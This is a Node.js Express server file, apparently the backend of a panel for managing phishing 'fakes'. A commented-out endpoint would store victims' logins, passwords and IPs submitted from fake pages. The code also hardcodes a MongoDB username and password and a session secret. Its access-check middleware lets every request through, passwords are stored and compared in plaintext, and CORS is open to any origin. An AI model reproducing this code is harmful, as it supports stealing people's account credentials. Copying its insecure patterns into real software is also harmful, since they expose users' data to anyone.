//Initialise variables from modules
const express = require("express");
const bodyParser = require("body-parser");
const session = require("express-session");
const MongoClient = require("mongodb").MongoClient;
const MongoDBStore = require("connect-mongodb-session")(session);
const path = require("path");

//enable express
const app = express();

//app.set('trust proxy', 1);
app.use(express.static(path.join(__dirname, "public")));

let store = new MongoDBStore({
  uri: "mongodb+srv://Gachinski:qwertyuiop@cluster0.qg8s1.mongodb.net/",
  databaseName: "test",
  collection: "session"
});

//Auth at mongoDB
const mongoClient = new MongoClient(
  "mongodb+srv://Gachinski:qwertyuiop@cluster0.qg8s1.mongodb.net/test?retryWrites=true&w=majority",
  {
    useNewUrlParser: true,
    useUnifiedTopology: true
  }
);

//Connect to mongoDB
mongoClient.connect(function(err, client) {
  app.use(
    require("express-session")({
      secret: "This is a secret",
      cookie: {
        maxAge: 1000 * 60 * 60 * 24
      },
      store: store,
      resave: true,
      saveUninitialized: true
    })
  );

  //Body-parser
  app.use(bodyParser.json({ limit: "100mb" }));
  app.use(bodyParser.urlencoded({ limit: "100mb", extended: true }));
  //CORS permissions
  app.use(function(req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Methods", "GET,PUT,POST,DELETE");
    res.header("Access-Control-Allow-Headers", "Content-Type");
    next();
  });

  //GET(POST) data from fakes
  // app.post("/AddNewAccount", bodyParser, function (request, response) {
  //     collection.insertOne({
  //         login: request.body.login,
  //         password: request.body.password,
  //         ip: request.body.ip
  //     }, function (err, result) {
  //         if (err) {
  //             console.log(err)
  //         }
  //     })
  // })

  //Check token to accsess profile page
  let TokenCheck = (request, response, next) => {
    if (request.session.user) {
      next();
    } else {
      next();
    }
  };
  let TokenCheckLogin = (request, response, next) => {
    if (request.session.user) {
      response.redirect("/profile");
      response.end();
    } else {
      next();
    }
  };

  //Log in function and update token
  app.post("/auth", function(request, response, next) {
    if (request.body) {
      client
        .db("DB")
        .collection("config")
        .findOne(
          {
            login: request.body.login,
            password: request.body.password
          },
          function(err, data) {
            if (data !== null) {
              request.session.user = {
                id: data["_id"],
                name: request.body.login
              }
              response.redirect("/profile")
              response.end()
            } else {
              response.redirect("/login?wrongData=true")
              response.end()
            }
          }
        );
    }
  });

  //connecting HTML files

  app.get("/logout", function(request, response) {
    request.session.destroy();
    response.redirect("/login");
  });
  app.post("/getData", function(request, response) {
    response.send({
        login: request.session.user.name
    });
  });
  app.get("/login", TokenCheckLogin, function(request, response) {
    response.sendFile(__dirname + "/public/pages/" + "login_page.html");
  });
  app.get("/panel", TokenCheck, function(request, response) {
    response.sendFile(__dirname + "/public/pages/" + "panel.html");
  });
  app.get("/stats", TokenCheck, function(request, response) {
    response.sendFile(__dirname + "/public/pages/" + "stats.html");
  });
  app.get("/settings", TokenCheck, function(request, response) {
    response.sendFile(__dirname + "/public/pages/" + "settings.html");
  });
  app.get("/fakes", TokenCheck, function(request, response) {
    response.sendFile(__dirname + "/public/pages/" + "fakes.html");
  });
  app.get("/profile", function(request, response) {
    response.sendFile(__dirname + "/public/pages/" + "profile.html");
  });
  app.get("/", TokenCheck, function(request, response) {
    response.redirect("/login");
  });
  app.get("/vk", (req, res) => {});
  //CSS files
  app.use("/style.css", function(req, res) {
    res.sendFile(__dirname + "/public/css/" + "style.css");
  });

  //connecting JS files
  app.use("/Auth.admin.js", function(req, res) {
    res.sendFile(__dirname + "/public/js/" + "Auth.admin.js");
  });
  app.use("/profile.scripts.js", function(req, res) {
    res.sendFile(__dirname + "/public/js/" + "profile.scripts.js");
  });
  app.use("/fakes.scripts.js", function(req, res) {
    res.sendFile(__dirname + "/public/js/" + "fakes.scripts.js");
  });
  app.use("/panel.scripts.js", function(req, res) {
    res.sendFile(__dirname + "/public/js/" + "panel.scripts.js");
  });
  app.use("/main.scripts.js", function(req, res) {
    res.sendFile(__dirname + "/public/js/" + "main.scripts.js");
  });
});

//Starting server
// app.listen(process.env.PORT, function() {
//   console.log("Сервер запущен: " + process.env.PORT);
// });

app.listen(5000, function() {
  console.log("Сервер запущен: 5000");
});
